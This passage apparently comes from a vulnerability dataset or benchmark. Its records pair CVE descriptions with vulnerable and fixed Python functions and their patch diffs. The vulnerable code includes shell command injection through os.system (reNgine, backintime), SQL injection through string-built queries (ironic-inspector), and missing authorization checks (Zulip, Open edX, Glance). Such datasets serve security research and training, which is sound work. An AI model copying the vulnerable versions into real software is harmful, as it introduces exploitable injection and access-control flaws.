        "snippet": "def update_user_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    user_id: int,\n    full_name: Optional[str] = REQ(default=None),\n    role: Optional[int] = REQ(\n        default=None,\n        json_validator=check_int_in(\n            UserProfile.ROLE_TYPES,\n        ),\n    ),\n    profile_data: Optional[List[Dict[str, Optional[Union[int, ProfileDataElementValue]]]]] = REQ(\n        default=None,\n        json_validator=check_profile_data,\n    ),\n) -> HttpResponse:\n    target = access_user_by_id(\n        user_profile, user_id, allow_deactivated=True, allow_bots=True, for_admin=True\n    )\n\n    if role is not None and target.role != role:\n        # Require that the current user has permissions to\n        # grant/remove the role in question.\n        #\n        # Logic replicated in patch_bot_backend.\n        if UserProfile.ROLE_REALM_OWNER in [role, target.role] and not user_profile.is_realm_owner:\n            raise OrganizationOwnerRequired()\n        elif not user_profile.is_realm_admin:\n            raise OrganizationAdministratorRequired()\n\n        if target.role == UserProfile.ROLE_REALM_OWNER and check_last_owner(target):\n            raise JsonableError(\n                _(\"The owner permission cannot be removed from the only organization owner.\")\n            )\n        do_change_user_role(target, role, acting_user=user_profile)\n\n    if full_name is not None and target.full_name != full_name and full_name.strip() != \"\":\n        # We don't respect `name_changes_disabled` here because the request\n        # is on behalf of the administrator.\n        check_change_full_name(target, full_name, user_profile)\n\n    if profile_data is not None:\n        clean_profile_data: List[ProfileDataElementUpdateDict] = []\n        for entry in profile_data:\n            assert isinstance(entry[\"id\"], int)\n            assert not isinstance(entry[\"value\"], int)\n            if entry[\"value\"] is None or not entry[\"value\"]:\n                field_id = entry[\"id\"]\n                check_remove_custom_profile_field_value(target, field_id)\n            else:\n                clean_profile_data.append(\n                    {\n                        \"id\": entry[\"id\"],\n                        \"value\": entry[\"value\"],\n                    }\n                )\n        validate_user_custom_profile_data(target.realm.id, clean_profile_data)\n        do_update_user_custom_profile_data_if_changed(target, clean_profile_data)\n\n    return json_success(request)"
      },
      {
        "id": "fix_py_409_2",
        "commit": "751b2a03e565e9eb02ffe923b7c24ac73d604034",
        "file_path": "zerver/views/users.py",
        "start_line": 305,
        "end_line": 407,
        "snippet": "def patch_bot_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    bot_id: int,\n    full_name: Optional[str] = REQ(default=None),\n    role: Optional[int] = REQ(\n        default=None,\n        json_validator=check_int_in(\n            UserProfile.ROLE_TYPES,\n        ),\n    ),\n    bot_owner_id: Optional[int] = REQ(json_validator=check_int, default=None),\n    config_data: Optional[Dict[str, str]] = REQ(\n        default=None, json_validator=check_dict(value_validator=check_string)\n    ),\n    service_payload_url: Optional[str] = REQ(json_validator=check_url, default=None),\n    service_interface: int = REQ(json_validator=check_int, default=1),\n    default_sending_stream: Optional[str] = REQ(default=None),\n    default_events_register_stream: Optional[str] = REQ(default=None),\n    default_all_public_streams: Optional[bool] = REQ(default=None, json_validator=check_bool),\n) -> HttpResponse:\n    bot = access_bot_by_id(user_profile, bot_id)\n\n    if full_name is not None:\n        check_change_bot_full_name(bot, full_name, user_profile)\n\n    if role is not None and bot.role != role:\n        # Logic duplicated from update_user_backend.\n        if UserProfile.ROLE_REALM_OWNER in [role, bot.role] and not user_profile.is_realm_owner:\n            raise OrganizationOwnerRequired()\n        elif not user_profile.is_realm_admin:\n            raise OrganizationAdministratorRequired()\n\n        do_change_user_role(bot, role, acting_user=user_profile)\n\n    if bot_owner_id is not None:\n        try:\n            owner = get_user_profile_by_id_in_realm(bot_owner_id, user_profile.realm)\n        except UserProfile.DoesNotExist:\n            raise JsonableError(_(\"Failed to change owner, no such user\"))\n        if not owner.is_active:\n            raise JsonableError(_(\"Failed to change owner, user is deactivated\"))\n        if owner.is_bot:\n            raise JsonableError(_(\"Failed to change owner, bots can't own other bots\"))\n\n        previous_owner = bot.bot_owner\n        if previous_owner != owner:\n            do_change_bot_owner(bot, owner, user_profile)\n\n    if default_sending_stream is not None:\n        if default_sending_stream == \"\":\n            stream: Optional[Stream] = None\n        else:\n            (stream, sub) = access_stream_by_name(user_profile, default_sending_stream)\n        do_change_default_sending_stream(bot, stream, acting_user=user_profile)\n    if default_events_register_stream is not None:\n        if default_events_register_stream == \"\":\n            stream = None\n        else:\n            (stream, sub) = access_stream_by_name(user_profile, default_events_register_stream)\n        do_change_default_events_register_stream(bot, stream, acting_user=user_profile)\n    if default_all_public_streams is not None:\n        do_change_default_all_public_streams(\n            bot, default_all_public_streams, acting_user=user_profile\n        )\n\n    if service_payload_url is not None:\n        check_valid_interface_type(service_interface)\n        assert service_interface is not None\n        do_update_outgoing_webhook_service(bot, service_interface, service_payload_url)\n\n    if config_data is not None:\n        do_update_bot_config_data(bot, config_data)\n\n    if len(request.FILES) == 0:\n        pass\n    elif len(request.FILES) == 1:\n        user_file = list(request.FILES.values())[0]\n        assert isinstance(user_file, UploadedFile)\n        assert user_file.size is not None\n        upload_avatar_image(user_file, user_profile, bot)\n        avatar_source = UserProfile.AVATAR_FROM_USER\n        do_change_avatar_fields(bot, avatar_source, acting_user=user_profile)\n    else:\n        raise JsonableError(_(\"You may only upload one file at a time\"))\n\n    json_result = dict(\n        full_name=bot.full_name,\n        avatar_url=avatar_url(bot),\n        service_interface=service_interface,\n        service_payload_url=service_payload_url,\n        config_data=config_data,\n        default_sending_stream=get_stream_name(bot.default_sending_stream),\n        default_events_register_stream=get_stream_name(bot.default_events_register_stream),\n        default_all_public_streams=bot.default_all_public_streams,\n    )\n\n    # Don't include the bot owner in case it is not set.\n    # Default bots have no owner.\n    if bot.bot_owner is not None:\n        json_result[\"bot_owner\"] = bot.bot_owner.email\n\n    return json_success(request, data=json_result)"
      }
    ],
    "vul_patch": "--- a/zerver/views/users.py\n+++ b/zerver/views/users.py\n@@ -20,13 +20,13 @@\n \n     if role is not None and target.role != role:\n         # Require that the current user has permissions to\n-        # grant/remove the role in question.  access_user_by_id has\n-        # already verified we're an administrator; here we enforce\n-        # that only owners can toggle the is_realm_owner flag.\n+        # grant/remove the role in question.\n         #\n         # Logic replicated in patch_bot_backend.\n         if UserProfile.ROLE_REALM_OWNER in [role, target.role] and not user_profile.is_realm_owner:\n             raise OrganizationOwnerRequired()\n+        elif not user_profile.is_realm_admin:\n+            raise OrganizationAdministratorRequired()\n \n         if target.role == UserProfile.ROLE_REALM_OWNER and check_last_owner(target):\n             raise JsonableError(\n\n--- a/zerver/views/users.py\n+++ b/zerver/views/users.py\n@@ -28,6 +28,8 @@\n         # Logic duplicated from update_user_backend.\n         if UserProfile.ROLE_REALM_OWNER in [role, bot.role] and not user_profile.is_realm_owner:\n             raise OrganizationOwnerRequired()\n+        elif not user_profile.is_realm_admin:\n+            raise OrganizationAdministratorRequired()\n \n         do_change_user_role(bot, role, acting_user=user_profile)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-22209",
    "cve_description": "Open edX Platform is a service-oriented platform for authoring and delivering online learning. A user with a JWT and more limited scopes could call endpoints exceeding their access. This vulnerability has been patched in commit 019888f.",
    "cwe_info": {
      "CWE-284": {
        "name": "Improper Access Control",
        "description": "The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor."
      }
    },
    "repo": "https://github.com/openedx/edx-platform",
    "patch_url": [
      "https://github.com/openedx/edx-platform/commit/019888f3d15beaebcb7782934f6c43b0c2b3735e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_293_1",
        "commit": "e7fc0c6",
        "file_path": "lms/djangoapps/courseware/block_render.py",
        "start_line": 737,
        "end_line": 795,
        "snippet": "def handle_xblock_callback(request, course_id, usage_id, handler, suffix=None):\n    \"\"\"\n    Generic view for extensions. This is where AJAX calls go.\n\n    Arguments:\n        request (Request): Django request.\n        course_id (str): Course containing the block\n        usage_id (str)\n        handler (str)\n        suffix (str)\n\n    Raises:\n        HttpResponseForbidden: If the request method is not `GET` and user is not authenticated.\n        Http404: If the course is not found in the modulestore.\n    \"\"\"\n    # In this case, we are using Session based authentication, so we need to check CSRF token.\n    if request.user.is_authenticated:\n        error = CsrfViewMiddleware(get_response=lambda request: None).process_view(request, None, (), {})\n        if error:\n            return error\n\n    # We are reusing DRF logic to provide support for JWT and Oauth2. We abandoned the idea of using DRF view here\n    # to avoid introducing backwards-incompatible changes.\n    # You can see https://github.com/openedx/XBlock/pull/383 for more details.\n    else:\n        authentication_classes = (JwtAuthentication, BearerAuthenticationAllowInactiveUser)\n        authenticators = [auth() for auth in authentication_classes]\n\n        for authenticator in authenticators:\n            try:\n                user_auth_tuple = authenticator.authenticate(request)\n            except APIException:\n                log.exception(\n                    \"XBlock handler %r failed to authenticate with %s\", handler, authenticator.__class__.__name__\n                )\n            else:\n                if user_auth_tuple is not None:\n                    request.user, _ = user_auth_tuple\n                    break\n\n    # NOTE (CCB): Allow anonymous GET calls (e.g. for transcripts). Modifying this view is simpler than updating\n    # the XBlocks to use `handle_xblock_callback_noauth`, which is practically identical to this view.\n    if request.method != 'GET' and not (request.user and request.user.is_authenticated):\n        return HttpResponseForbidden('Unauthenticated')\n\n    request.user.known = request.user.is_authenticated\n\n    try:\n        course_key = CourseKey.from_string(course_id)\n    except InvalidKeyError:\n        raise Http404(f'{course_id} is not a valid course key')  # lint-amnesty, pylint: disable=raise-missing-from\n\n    with modulestore().bulk_operations(course_key):\n        try:\n            course = modulestore().get_course(course_key)\n        except ItemNotFoundError:\n            raise Http404(f'{course_id} does not exist in the modulestore')  # lint-amnesty, pylint: disable=raise-missing-from\n\n        return _invoke_xblock_handler(request, course_id, usage_id, handler, suffix, course=course)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_293_1",
        "commit": "019888f3d15beaebcb7782934f6c43b0c2b3735e",
        "file_path": "lms/djangoapps/courseware/block_render.py",
        "start_line": 738,
        "end_line": 803,
        "snippet": "def handle_xblock_callback(request, course_id, usage_id, handler, suffix=None):\n    \"\"\"\n    Generic view for extensions. This is where AJAX calls go.\n\n    Arguments:\n        request (Request): Django request.\n        course_id (str): Course containing the block\n        usage_id (str)\n        handler (str)\n        suffix (str)\n\n    Raises:\n        HttpResponseForbidden: If the request method is not `GET` and user is not authenticated.\n        Http404: If the course is not found in the modulestore.\n    \"\"\"\n    # In this case, we are using Session based authentication, so we need to check CSRF token.\n    if request.user.is_authenticated:\n        error = CsrfViewMiddleware(get_response=lambda request: None).process_view(request, None, (), {})\n        if error:\n            return error\n\n    # We are reusing DRF logic to provide support for JWT and Oauth2. We abandoned the idea of using DRF view here\n    # to avoid introducing backwards-incompatible changes.\n    # You can see https://github.com/openedx/XBlock/pull/383 for more details.\n    else:\n        authentication_classes = (JwtAuthentication, BearerAuthenticationAllowInactiveUser)\n        authenticators = [auth() for auth in authentication_classes]\n\n        for authenticator in authenticators:\n            try:\n                user_auth_tuple = authenticator.authenticate(request)\n            except APIException:\n                log.exception(\n                    \"XBlock handler %r failed to authenticate with %s\", handler, authenticator.__class__.__name__\n                )\n            else:\n                if user_auth_tuple is not None:\n                    # When using JWT authentication, the second element contains the JWT token. We need it to determine\n                    # whether the application that issued the token is restricted.\n                    request.user, request.auth = user_auth_tuple\n                    # This is verified by the `JwtRestrictedApplication` before it decodes the token.\n                    request.successful_authenticator = authenticator\n                    break\n\n    # NOTE (CCB): Allow anonymous GET calls (e.g. for transcripts). Modifying this view is simpler than updating\n    # the XBlocks to use `handle_xblock_callback_noauth`, which is practically identical to this view.\n    # Block all request types coming from restricted applications.\n    if (\n        request.method != 'GET' and not (request.user and request.user.is_authenticated)\n    ) or JwtRestrictedApplication().has_permission(request, None):  # type: ignore\n        return HttpResponseForbidden('Unauthenticated')\n\n    request.user.known = request.user.is_authenticated\n\n    try:\n        course_key = CourseKey.from_string(course_id)\n    except InvalidKeyError:\n        raise Http404(f'{course_id} is not a valid course key')  # lint-amnesty, pylint: disable=raise-missing-from\n\n    with modulestore().bulk_operations(course_key):\n        try:\n            course = modulestore().get_course(course_key)\n        except ItemNotFoundError:\n            raise Http404(f'{course_id} does not exist in the modulestore')  # lint-amnesty, pylint: disable=raise-missing-from\n\n        return _invoke_xblock_handler(request, course_id, usage_id, handler, suffix, course=course)"
      }
    ],
    "vul_patch": "--- a/lms/djangoapps/courseware/block_render.py\n+++ b/lms/djangoapps/courseware/block_render.py\n@@ -35,12 +35,19 @@\n                 )\n             else:\n                 if user_auth_tuple is not None:\n-                    request.user, _ = user_auth_tuple\n+                    # When using JWT authentication, the second element contains the JWT token. We need it to determine\n+                    # whether the application that issued the token is restricted.\n+                    request.user, request.auth = user_auth_tuple\n+                    # This is verified by the `JwtRestrictedApplication` before it decodes the token.\n+                    request.successful_authenticator = authenticator\n                     break\n \n     # NOTE (CCB): Allow anonymous GET calls (e.g. for transcripts). Modifying this view is simpler than updating\n     # the XBlocks to use `handle_xblock_callback_noauth`, which is practically identical to this view.\n-    if request.method != 'GET' and not (request.user and request.user.is_authenticated):\n+    # Block all request types coming from restricted applications.\n+    if (\n+        request.method != 'GET' and not (request.user and request.user.is_authenticated)\n+    ) or JwtRestrictedApplication().has_permission(request, None):  # type: ignore\n         return HttpResponseForbidden('Unauthenticated')\n \n     request.user.known = request.user.is_authenticated\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-1813",
    "cve_description": "OS Command Injection in GitHub repository yogeshojha/rengine prior to 1.2.0.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/yogeshojha/rengine",
    "patch_url": [
      "https://github.com/yogeshojha/rengine/commit/8277cec0f008a0451371a92e7e0bf082ab3f0c34"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_116_1",
        "commit": "72a5fb2",
        "file_path": "web/reNgine/common_func.py",
        "start_line": 668,
        "end_line": 709,
        "snippet": "def get_cms_details(url):\n    # this function will fetch cms details using cms_detector\n    response = {}\n    cms_detector_command = 'python3 /usr/src/github/CMSeeK/cmseek.py -u {} --random-agent --batch --follow-redirect'.format(url)\n    os.system(cms_detector_command)\n\n    response['status'] = False\n    response['message'] = 'Could not detect CMS!'\n\n    parsed_url = urlparse(url)\n\n    domain_name = parsed_url.hostname\n    port = parsed_url.port\n\n    find_dir = domain_name\n\n    if port:\n        find_dir += '_{}'.format(port)\n\n\n    print(url)\n    print(find_dir)\n\n    # subdomain may also have port number, and is stored in dir as _port\n\n    cms_dir_path =  '/usr/src/github/CMSeeK/Result/{}'.format(find_dir)\n    cms_json_path =  cms_dir_path + '/cms.json'\n\n    if os.path.isfile(cms_json_path):\n        cms_file_content = json.loads(open(cms_json_path, 'r').read())\n        if not cms_file_content.get('cms_id'):\n            return response\n        response = {}\n        response = cms_file_content\n        response['status'] = True\n        # remove cms dir path\n        try:\n            shutil.rmtree(cms_dir_path)\n        except Exception as e:\n            print(e)\n\n    return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_116_1",
        "commit": "8277cec",
        "file_path": "web/reNgine/common_func.py",
        "start_line": 669,
        "end_line": 714,
        "snippet": "def get_cms_details(url):\n    # this function will fetch cms details using cms_detector\n    response = {}\n    cms_detector_command = 'python3 /usr/src/github/CMSeeK/cmseek.py --random-agent --batch --follow-redirect'\n    subprocess_splitted_command = cms_detector_command.split()\n    subprocess_splitted_command.append('-u')\n    subprocess_splitted_command.append(url)\n    process = subprocess.Popen(subprocess_splitted_command)\n    process.wait()\n\n    response['status'] = False\n    response['message'] = 'Could not detect CMS!'\n\n    parsed_url = urlparse(url)\n\n    domain_name = parsed_url.hostname\n    port = parsed_url.port\n\n    find_dir = domain_name\n\n    if port:\n        find_dir += '_{}'.format(port)\n\n\n    print(url)\n    print(find_dir)\n\n    # subdomain may also have port number, and is stored in dir as _port\n\n    cms_dir_path =  '/usr/src/github/CMSeeK/Result/{}'.format(find_dir)\n    cms_json_path =  cms_dir_path + '/cms.json'\n\n    if os.path.isfile(cms_json_path):\n        cms_file_content = json.loads(open(cms_json_path, 'r').read())\n        if not cms_file_content.get('cms_id'):\n            return response\n        response = {}\n        response = cms_file_content\n        response['status'] = True\n        # remove cms dir path\n        try:\n            shutil.rmtree(cms_dir_path)\n        except Exception as e:\n            print(e)\n\n    return response"
      }
    ],
    "vul_patch": "--- a/web/reNgine/common_func.py\n+++ b/web/reNgine/common_func.py\n@@ -1,8 +1,12 @@\n def get_cms_details(url):\n     # this function will fetch cms details using cms_detector\n     response = {}\n-    cms_detector_command = 'python3 /usr/src/github/CMSeeK/cmseek.py -u {} --random-agent --batch --follow-redirect'.format(url)\n-    os.system(cms_detector_command)\n+    cms_detector_command = 'python3 /usr/src/github/CMSeeK/cmseek.py --random-agent --batch --follow-redirect'\n+    subprocess_splitted_command = cms_detector_command.split()\n+    subprocess_splitted_command.append('-u')\n+    subprocess_splitted_command.append(url)\n+    process = subprocess.Popen(subprocess_splitted_command)\n+    process.wait()\n \n     response['status'] = False\n     response['message'] = 'Could not detect CMS!'\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-7200",
    "cve_description": "An SSRF issue was discovered in OpenStack Glance before Newton. The 'copy_from' feature in the Image Service API v1 allowed an attacker to perform masked network port scans. With v1, it is possible to create images with a URL such as 'http://localhost:22'. This could then allow an attacker to enumerate internal network details while appearing masked, since the scan would appear to originate from the Glance Image service.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/openstack/glance",
    "patch_url": [
      "https://github.com/openstack/glance/commit/b1ac90f7914d91b25144cc4063fa994fb5019ee3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_272_1",
        "commit": "cc6ce4a",
        "file_path": "glance/api/v1/images.py",
        "start_line": 640,
        "end_line": 700,
        "snippet": "    def create(self, req, image_meta, image_data):\n        \"\"\"\n        Adds a new image to Glance. Four scenarios exist when creating an\n        image:\n\n        1. If the image data is available directly for upload, create can be\n           passed the image data as the request body and the metadata as the\n           request headers. The image will initially be 'queued', during\n           upload it will be in the 'saving' status, and then 'killed' or\n           'active' depending on whether the upload completed successfully.\n\n        2. If the image data exists somewhere else, you can upload indirectly\n           from the external source using the x-glance-api-copy-from header.\n           Once the image is uploaded, the external store is not subsequently\n           consulted, i.e. the image content is served out from the configured\n           glance image store.  State transitions are as for option #1.\n\n        3. If the image data exists somewhere else, you can reference the\n           source using the x-image-meta-location header. The image content\n           will be served out from the external store, i.e. is never uploaded\n           to the configured glance image store.\n\n        4. If the image data is not available yet, but you'd like reserve a\n           spot for it, you can omit the data and a record will be created in\n           the 'queued' state. This exists primarily to maintain backwards\n           compatibility with OpenStack/Rackspace API semantics.\n\n        The request body *must* be encoded as application/octet-stream,\n        otherwise an HTTPBadRequest is returned.\n\n        Upon a successful save of the image data and metadata, a response\n        containing metadata about the image is returned, including its\n        opaque identifier.\n\n        :param req: The WSGI/Webob Request object\n        :param image_meta: Mapping of metadata about image\n        :param image_data: Actual image data that is to be stored\n\n        :raises HTTPBadRequest if x-image-meta-location is missing\n                and the request body is not application/octet-stream\n                image data.\n        \"\"\"\n        self._enforce(req, 'add_image')\n        is_public = image_meta.get('is_public')\n        if is_public:\n            self._enforce(req, 'publicize_image')\n\n        image_meta = self._reserve(req, image_meta)\n        id = image_meta['id']\n\n        image_meta = self._handle_source(req, id, image_meta, image_data)\n\n        location_uri = image_meta.get('location')\n        if location_uri:\n            self.update_store_acls(req, id, location_uri, public=is_public)\n\n        # Prevent client from learning the location, as it\n        # could contain security credentials\n        image_meta.pop('location', None)\n\n        return {'image_meta': image_meta}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_272_1",
        "commit": "b1ac90f7914d91b25144cc4063fa994fb5019ee3",
        "file_path": "glance/api/v1/images.py",
        "start_line": 640,
        "end_line": 702,
        "snippet": "    def create(self, req, image_meta, image_data):\n        \"\"\"\n        Adds a new image to Glance. Four scenarios exist when creating an\n        image:\n\n        1. If the image data is available directly for upload, create can be\n           passed the image data as the request body and the metadata as the\n           request headers. The image will initially be 'queued', during\n           upload it will be in the 'saving' status, and then 'killed' or\n           'active' depending on whether the upload completed successfully.\n\n        2. If the image data exists somewhere else, you can upload indirectly\n           from the external source using the x-glance-api-copy-from header.\n           Once the image is uploaded, the external store is not subsequently\n           consulted, i.e. the image content is served out from the configured\n           glance image store.  State transitions are as for option #1.\n\n        3. If the image data exists somewhere else, you can reference the\n           source using the x-image-meta-location header. The image content\n           will be served out from the external store, i.e. is never uploaded\n           to the configured glance image store.\n\n        4. If the image data is not available yet, but you'd like reserve a\n           spot for it, you can omit the data and a record will be created in\n           the 'queued' state. This exists primarily to maintain backwards\n           compatibility with OpenStack/Rackspace API semantics.\n\n        The request body *must* be encoded as application/octet-stream,\n        otherwise an HTTPBadRequest is returned.\n\n        Upon a successful save of the image data and metadata, a response\n        containing metadata about the image is returned, including its\n        opaque identifier.\n\n        :param req: The WSGI/Webob Request object\n        :param image_meta: Mapping of metadata about image\n        :param image_data: Actual image data that is to be stored\n\n        :raises HTTPBadRequest if x-image-meta-location is missing\n                and the request body is not application/octet-stream\n                image data.\n        \"\"\"\n        self._enforce(req, 'add_image')\n        is_public = image_meta.get('is_public')\n        if is_public:\n            self._enforce(req, 'publicize_image')\n        if Controller._copy_from(req):\n            self._enforce(req, 'copy_from')\n\n        image_meta = self._reserve(req, image_meta)\n        id = image_meta['id']\n\n        image_meta = self._handle_source(req, id, image_meta, image_data)\n\n        location_uri = image_meta.get('location')\n        if location_uri:\n            self.update_store_acls(req, id, location_uri, public=is_public)\n\n        # Prevent client from learning the location, as it\n        # could contain security credentials\n        image_meta.pop('location', None)\n\n        return {'image_meta': image_meta}"
      }
    ],
    "vul_patch": "--- a/glance/api/v1/images.py\n+++ b/glance/api/v1/images.py\n@@ -44,6 +44,8 @@\n         is_public = image_meta.get('is_public')\n         if is_public:\n             self._enforce(req, 'publicize_image')\n+        if Controller._copy_from(req):\n+            self._enforce(req, 'copy_from')\n \n         image_meta = self._reserve(req, image_meta)\n         id = image_meta['id']\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-16667",
    "cve_description": "backintime (aka Back in Time) before 1.1.24 did improper escaping/quoting of file paths used as arguments to the 'notify-send' command, leading to some parts of file paths being executed as shell commands within an os.system call in qt4/plugins/notifyplugin.py. This could allow an attacker to craft an unreadable file with a specific name to run arbitrary shell commands.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/bit-team/backintime",
    "patch_url": [
      "https://github.com/bit-team/backintime/commit/cef81d0da93ff601252607df3db1a48f7f6f01b3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_374_1",
        "commit": "c36d3682c40cf29713bee9a1a8735574d4e032e2",
        "file_path": "qt4/plugins/notifyplugin.py",
        "start_line": 65,
        "end_line": 78,
        "snippet": "    def on_message( self, profile_id, profile_name, level, message, timeout ):\n        if 1 == level:\n            cmd = \"notify-send \"\n            if timeout > 0:\n                cmd = cmd + \" -t %s\" % (1000 * timeout)\n\n            title = \"Back In Time (%s) : %s\" % (self.user, profile_name)\n            message = message.replace(\"\\n\", ' ')\n            message = message.replace(\"\\r\", '')\n\n            cmd = cmd + \" \\\"%s\\\" \\\"%s\\\"\" % (title, message)\n            print(cmd)\n            os.system(cmd)\n        return"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_374_1",
        "commit": "cef81d0da93ff601252607df3db1a48f7f6f01b3",
        "file_path": "qt4/plugins/notifyplugin.py",
        "start_line": 66,
        "end_line": 79,
        "snippet": "    def on_message( self, profile_id, profile_name, level, message, timeout ):\n        if 1 == level:\n            cmd = ['notify-send']\n            if timeout > 0:\n                cmd.extend(['-t', str(1000 * timeout)])\n\n            title = \"Back In Time (%s) : %s\" % (self.user, profile_name)\n            message = message.replace(\"\\n\", ' ')\n            message = message.replace(\"\\r\", '')\n\n            cmd.append(title)\n            cmd.append(message)\n            subprocess.Popen(cmd).communicate()\n        return"
      }
    ],
    "vul_patch": "--- a/qt4/plugins/notifyplugin.py\n+++ b/qt4/plugins/notifyplugin.py\n@@ -1,14 +1,14 @@\n     def on_message( self, profile_id, profile_name, level, message, timeout ):\n         if 1 == level:\n-            cmd = \"notify-send \"\n+            cmd = ['notify-send']\n             if timeout > 0:\n-                cmd = cmd + \" -t %s\" % (1000 * timeout)\n+                cmd.extend(['-t', str(1000 * timeout)])\n \n             title = \"Back In Time (%s) : %s\" % (self.user, profile_name)\n             message = message.replace(\"\\n\", ' ')\n             message = message.replace(\"\\r\", '')\n \n-            cmd = cmd + \" \\\"%s\\\" \\\"%s\\\"\" % (title, message)\n-            print(cmd)\n-            os.system(cmd)\n+            cmd.append(title)\n+            cmd.append(message)\n+            subprocess.Popen(cmd).communicate()\n         return\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-10141",
    "cve_description": "A vulnerability was found in openstack-ironic-inspector all versions excluding 5.0.2, 6.0.3, 7.2.4, 8.0.3 and 8.2.1. A SQL-injection vulnerability was found in openstack-ironic-inspector's node_cache.find_node(). This function makes a SQL query using unfiltered data from a server reporting inspection results (by a POST to the /v1/continue endpoint). Because the API is unauthenticated, the flaw could be exploited by an attacker with access to the network on which ironic-inspector is listening. Because of how ironic-inspector uses the query results, it is unlikely that data could be obtained. However, the attacker could pass malicious data and create a denial of service.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/openstack/ironic-inspector",
    "patch_url": [
      "https://github.com/openstack/ironic-inspector/commit/9d107900b2e0b599397b84409580d46e0ed16291",
      "https://github.com/openstack/ironic-inspector/commit/97f9d34f8376ac7accd2597b3bdce67a9dac664f",
      "https://github.com/openstack/ironic-inspector/commit/17c796b49171b6133e988f78c92d7c9b7ed3fcf3",
      "https://github.com/openstack/ironic-inspector/commit/67ff87ebca1016d44bd9d284ec4c16a88a533cfc"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_134_1",
        "commit": "b8d1bda",
        "file_path": "ironic_inspector/node_cache.py",
        "start_line": 819,
        "end_line": 894,
        "snippet": "def find_node(**attributes):\n    \"\"\"Find node in cache.\n\n    Looks up a node based on attributes in a best-match fashion.\n    This function acquires a lock on a node.\n\n    :param attributes: attributes known about this node (like macs, BMC etc)\n                       also ironic client instance may be passed under 'ironic'\n    :returns: structure NodeInfo with attributes ``uuid`` and ``created_at``\n    :raises: Error if node is not found or multiple nodes match the attributes\n    \"\"\"\n    ironic = attributes.pop('ironic', None)\n    # NOTE(dtantsur): sorting is not required, but gives us predictability\n    found = collections.Counter()\n\n    for (name, value) in sorted(attributes.items()):\n        if not value:\n            LOG.debug('Empty value for attribute %s', name)\n            continue\n        if not isinstance(value, list):\n            value = [value]\n\n        LOG.debug('Trying to use %s of value %s for node look up',\n                  name, value)\n        value_list = []\n        for v in value:\n            value_list.append(\"name='%s' AND value='%s'\" % (name, v))\n        stmt = ('select distinct node_uuid from attributes where ' +\n                ' OR '.join(value_list))\n        rows = (db.model_query(db.Attribute.node_uuid).from_statement(\n            text(stmt)).all())\n        found.update(row.node_uuid for row in rows)\n\n    if not found:\n        raise utils.NotFoundInCacheError(_(\n            'Could not find a node for attributes %s') % attributes)\n\n    most_common = found.most_common()\n    LOG.debug('The following nodes match the attributes: %(attributes)s, '\n              'scoring: %(most_common)s',\n              {'most_common': ', '.join('%s: %d' % tpl for tpl in most_common),\n               'attributes': ', '.join('%s=%s' % tpl for tpl in\n                                       attributes.items())})\n\n    # NOTE(milan) most_common is sorted, higher scores first\n    highest_score = most_common[0][1]\n    found = [item[0] for item in most_common if highest_score == item[1]]\n    if len(found) > 1:\n        raise utils.Error(_(\n            'Multiple nodes match the same number of attributes '\n            '%(attr)s: %(found)s')\n            % {'attr': attributes, 'found': found}, code=404)\n\n    uuid = found.pop()\n    node_info = NodeInfo(uuid=uuid, ironic=ironic)\n    node_info.acquire_lock()\n\n    try:\n        row = (db.model_query(db.Node.started_at, db.Node.finished_at).\n               filter_by(uuid=uuid).first())\n\n        if not row:\n            raise utils.Error(_(\n                'Could not find node %s in introspection cache, '\n                'probably it\\'s not on introspection now') % uuid, code=404)\n\n        if row.finished_at:\n            raise utils.Error(_(\n                'Introspection for node %(node)s already finished on '\n                '%(finish)s') % {'node': uuid, 'finish': row.finished_at})\n\n        node_info.started_at = row.started_at\n        return node_info\n    except Exception:\n        with excutils.save_and_reraise_exception():\n            node_info.release_lock()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_134_1",
        "commit": "9d10790",
        "file_path": "ironic_inspector/node_cache.py",
        "start_line": 819,
        "end_line": 891,
